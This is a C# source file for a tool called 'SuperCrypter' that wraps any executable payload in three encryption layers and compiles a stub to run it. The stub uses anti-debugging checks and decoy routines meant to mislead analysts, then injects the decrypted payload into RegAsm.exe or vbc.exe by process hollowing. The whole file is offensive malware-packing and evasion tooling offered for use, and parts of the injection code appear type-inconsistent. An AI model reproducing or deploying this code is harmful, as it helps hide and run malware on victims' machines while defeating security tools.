using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Resources;
using System.CodeDom.Compiler;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.CSharp;

public class SuperCrypter
{
    // A selection of encryption and obfuscation methods ported from GClass0.cs
    #region EncryptionMethods

    /// <summary>
    /// AES encryption. A strong, standard symmetric encryption algorithm.
    /// </summary>
    public static byte[] AESEncrypt(byte[] data, string password)
    {
        using (var aes = new AesManaged())
        {
            var keyBytes = new byte[32];
            var passBytes = Encoding.UTF8.GetBytes(password);
            Array.Copy(passBytes, keyBytes, Math.Min(keyBytes.Length, passBytes.Length));

            aes.Key = keyBytes;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.GenerateIV();
            var iv = aes.IV;

            using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
            using (var ms = new MemoryStream())
            {
                ms.Write(iv, 0, iv.Length); // Prepend IV
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                }
                return ms.ToArray();
            }
        }
    }

    /// <summary>
    /// A custom polymorphic reverse-and-XOR encryption algorithm.
    /// </summary>
    public static byte[] PolyRevEncrypt(byte[] data, string key)
    {
        byte randomByte = (byte)new Random().Next(1, 255);
        byte[] keyBytes = Encoding.ASCII.GetBytes(key);
        byte[] encryptedData = new byte[data.Length + 1];

        Array.Reverse(keyBytes); // Part of the polymorphic nature
        int keyIndex = 0;

        for (int i = 0; i < data.Length; i++)
        {
            encryptedData[i] = (byte)((data[i] ^ keyBytes[keyIndex]) ^ randomByte);
            if (++keyIndex >= keyBytes.Length)
            {
                keyIndex = 0;
            }
        }

        encryptedData[data.Length] = randomByte;
        Array.Reverse(encryptedData);
        return encryptedData;
    }

    /// <summary>
    /// A complex, byte-shifting XOR algorithm for an extra layer of obfuscation.
    /// </summary>
    public static byte[] DexEncrypt(byte[] data, string key)
    {
        byte[] keyBytes = System.Text.Encoding.ASCII.GetBytes(key);
        for (int i = 0; i < 5; i++) // Multiple passes to increase complexity
        {
            for (int j = 0; j < data.Length; j++)
            {
                data[j] ^= keyBytes[j % keyBytes.Length];
                for (int k = 0; k < keyBytes.Length; k++)
                {
                    data[j] = (byte)((int)data[j] ^ ((int)((int)keyBytes[k] << (i & 31)) ^ k) + j);
                }
            }
        }
        return data;
    }

    #endregion

    /// <summary>
    /// Generates a random alphanumeric string of a given length.
    /// </summary>
    private static string GenerateRandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var random = new Random();
        return new string(Enumerable.Repeat(chars, length)
          .Select(s => s[random.Next(s.Length)]).ToArray());
    }

    /// <summary>
    /// The C# source code for the executable stub.
    /// </summary>
    private static string GetStubSource()
    {
        return @"
using System;
using System.IO;
using System.Text;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class Stub
{
    [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
    static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

    #region RunPE
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool GetThreadContext(IntPtr hThread, ref long lpContext);
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64GetThreadContext(IntPtr hThread, ref long lpContext);
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool SetThreadContext(IntPtr hThread, ref long lpContext);
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool Wow64SetThreadContext(IntPtr hThread, ref long lpContext);
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern uint ResumeThread(IntPtr hThread);
    [DllImport(""ntdll.dll"", SetLastError = true)] private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport(""kernel32.dll"", SetLastError = true)] private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
    #endregion

    #region Decryption
    public static byte[] AESDecrypt(byte[] data, string password)
    {
        var passBytes = Encoding.UTF8.GetBytes(password);
        var keyBytes = new byte[32];
        Array.Copy(passBytes, keyBytes, Math.Min(keyBytes.Length, passBytes.Length));
        using (var aes = new AesManaged()) {
            aes.Key = keyBytes; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
            var iv = new byte[16];
            Array.Copy(data, 0, iv, 0, iv.Length);
            aes.IV = iv;
            using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV)) using (var ms = new MemoryStream()) {
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write)) {
                    cs.Write(data, iv.Length, data.Length - iv.Length);
                    cs.FlushFinalBlock();
                } return ms.ToArray();
            }
        }
    }

    public static byte[] PolyRevDecrypt(byte[] data, string key)
    {
        Array.Reverse(data);
        byte randomByte = data[data.Length - 1];
        byte[] keyBytes = Encoding.ASCII.GetBytes(key);
        byte[] decryptedData = new byte[data.Length - 1];
        Array.Reverse(keyBytes); int keyIndex = 0;
        for (int i = 0; i < decryptedData.Length; i++) {
            decryptedData[i] = (byte)((data[i] ^ randomByte) ^ keyBytes[keyIndex]);
            if (++keyIndex >= keyBytes.Length) keyIndex = 0;
        } return decryptedData;
    }

    public static byte[] DexDecrypt(byte[] data, string key)
    {
        byte[] keyBytes = System.Text.Encoding.ASCII.GetBytes(key);
        for (int i = 0; i < 5; i++) {
            for (int j = 0; j < data.Length; j++) {
                data[j] ^= keyBytes[j % keyBytes.Length];
                for (int k = 0; k < keyBytes.Length; k++) {
                    data[j] = (byte)((int)data[j] ^ ((int)((int)keyBytes[k] << (i & 31)) ^ k) + j);
                }
            }
        } return data;
    }

    // Decoy decryption routine. It looks plausible but does nothing.
    public static byte[] RC4Decrypt_Decoy(byte[] data, string key)
    {
        // This is a decoy method to confuse analysis. It doesn't actually decrypt.
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        byte[] s = new byte[256];
        for(int i = 0; i < 256; i++) s[i] = (byte)i;
        int j = 0;
        for (int i = 0; i < 256; i++) {
            j = (j + s[i] + keyBytes[i % keyBytes.Length]) % 256;
            byte temp = s[i]; s[i] = s[j]; s[j] = temp;
        }
        return data; // Return original data
    }
    #endregion

    public static void Execute(byte[] payload, string host)
    {
        STARTUPINFO si = new STARTUPINFO(); PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); si.cb = Marshal.SizeOf(si);
        try
        {
            if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) throw new Exception();
            int e_lfanew = BitConverter.ToInt32(payload, 60); int opHeader = e_lfanew + 24; short magic = BitConverter.ToInt16(payload, opHeader);
            long imageBase, context = 0;
            if (magic == 0x10b) { context = Marshal.AllocHGlobal(716); Marshal.WriteInt64(context, 0, 0x10002); if (IntPtr.Size == 4) GetThreadContext(pi.hThread, ref context); else Wow64GetThreadContext(pi.hThread, ref context); imageBase = BitConverter.ToInt32(payload, opHeader + 28); }
            else if (magic == 0x20b) { context = Marshal.AllocHGlobal(1232); Marshal.WriteInt64(context, 0, 0x100002); GetThreadContext(pi.hThread, ref context); imageBase = BitConverter.ToInt64(payload, opHeader + 24); }
            else throw new Exception();
            NtUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
            uint sizeOfImage = BitConverter.ToUInt32(payload, opHeader + 56);
            IntPtr newImageBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40);
            if (newImageBase == IntPtr.Zero) throw new Exception();
            int bytesWritten = 0;
            WriteProcessMemory(pi.hProcess, newImageBase, payload, (int)BitConverter.ToUInt32(payload, opHeader + 60), ref bytesWritten);
            for (int i = 0; i < BitConverter.ToInt16(payload, e_lfanew + 6); i++) {
                int sectionOffset = opHeader + BitConverter.ToInt16(payload, opHeader - 2) + (i * 40);
                int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 16);
                if (sizeOfRawData > 0) {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(payload, BitConverter.ToInt32(payload, sectionOffset + 20), sectionData, 0, sectionData.Length);
                    WriteProcessMemory(pi.hProcess, (IntPtr)(newImageBase.ToInt64() + BitConverter.ToInt32(payload, sectionOffset + 12)), sectionData, sectionData.Length, ref bytesWritten);
                }
            }
            if (magic == 0x10b) { long eax = Marshal.ReadInt64(context, 44); WriteProcessMemory(pi.hProcess, (IntPtr)(eax + 8), BitConverter.GetBytes(newImageBase.ToInt64()), 4, ref bytesWritten); Marshal.WriteInt64(context, 32, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); if (IntPtr.Size == 4) SetThreadContext(pi.hThread, ref context); else Wow64SetThreadContext(pi.hThread, ref context); }
            else { long rdx = Marshal.ReadInt64(context, 136); WriteProcessMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(newImageBase.ToInt64()), 8, ref bytesWritten); Marshal.WriteInt64(context, 128, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); SetThreadContext(pi.hThread, ref context); }
            Marshal.FreeHGlobal(context);
            ResumeThread(pi.hThread);
        } catch {}
    }

    public static void Main()
    {
        bool isDebuggerPresent = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
        if (isDebuggerPresent) return;

        // Decoy calculations to waste analysis time
        double decoy = Math.PI;
        for(int i=0; i<1000; i++) { decoy = Math.Sqrt(decoy * 1.00001); }

        Thread.Sleep(2000);

        var assembly = Assembly.GetExecutingAssembly();
        var stream = assembly.GetManifestResourceStream(""[RESOURCE_NAME]"");
        var reader = new ResourceManager(""[RESOURCE_NAME]"", assembly);
        byte[] payload = (byte[])reader.GetObject(""[PAYLOAD_KEY]"");

        // Decoy decryption call
        payload = RC4Decrypt_Decoy(payload, ""a-fake-key-to-mislead-analysts"");

        // Three layers of real decryption
        payload = DexDecrypt(payload, ""[KEY3]"");
        payload = PolyRevDecrypt(payload, ""[KEY2]"");
        payload = AESDecrypt(payload, ""[KEY1]"");

        string frameworkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), ""Microsoft.NET\\Framework\\v4.0.30319"");
        string target = Path.Combine(frameworkDir, ""RegAsm.exe"");
        if(!File.Exists(target))
        {
            target = Path.Combine(frameworkDir, ""vbc.exe"");
        }
        Execute(payload, target);
    }
}
";
    }


    public static void Main(string[] args)
    {
        if (args.Length < 3)
        {
            Console.WriteLine("Usage: SuperCrypter.exe <payload_path> <output_path> <aes_password>");
            return;
        }

        string payloadPath = args[0];
        string outputPath = args[1];
        string key1 = args[2]; // AES key from user
        string key2 = GenerateRandomString(24); // PolyRev key
        string key3 = GenerateRandomString(32); // Dex key
        string resourceName = GenerateRandomString(8);
        string payloadKey = GenerateRandomString(8);

        if (!File.Exists(payloadPath))
        {
            Console.WriteLine("Error: Payload file not found.");
            return;
        }

        try
        {
            Console.WriteLine("Reading payload...");
            byte[] payloadBytes = File.ReadAllBytes(payloadPath);

            Console.WriteLine("Encrypting with AES (Layer 1)...");
            byte[] encrypted1 = AESEncrypt(payloadBytes, key1);

            Console.WriteLine("Encrypting with PolyRev (Layer 2)...");
            byte[] encrypted2 = PolyRevEncrypt(encrypted1, key2);

            Console.WriteLine("Encrypting with Dex (Layer 3)...");
            byte[] encrypted3 = DexEncrypt(encrypted2, key3);

            Console.WriteLine("Generating stub...");
            string stubSource = GetStubSource();
            stubSource = stubSource.Replace("[RESOURCE_NAME]", resourceName);
            stubSource = stubSource.Replace("[PAYLOAD_KEY]", payloadKey);
            stubSource = stubSource.Replace("[KEY1]", key1);
            stubSource = stubSource.Replace("[KEY2]", key2);
            stubSource = stubSource.Replace("[KEY3]", key3);

            string resourceFileName = Path.Combine(Path.GetTempPath(), resourceName + ".resources");
            using (var resourceWriter = new ResourceWriter(resourceFileName))
            {
                resourceWriter.AddResource(payloadKey, encrypted3);
            }

            Console.WriteLine("Compiling executable...");
            var provider = new CSharpCodeProvider();
            var parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outputPath,
                CompilerOptions = "/target:winexe /platform:anycpu",
                EmbeddedResources = { resourceFileName }
            };
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, stubSource);

            File.Delete(resourceFileName);

            if (results.Errors.HasErrors)
            {
                Console.WriteLine("Compilation failed:");
                foreach (CompilerError error in results.Errors)
                {
                    Console.WriteLine($">> {error.ErrorText}");
                }
            }
            else
            {
                Console.WriteLine($"Success! Crypter created at: {outputPath}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }
}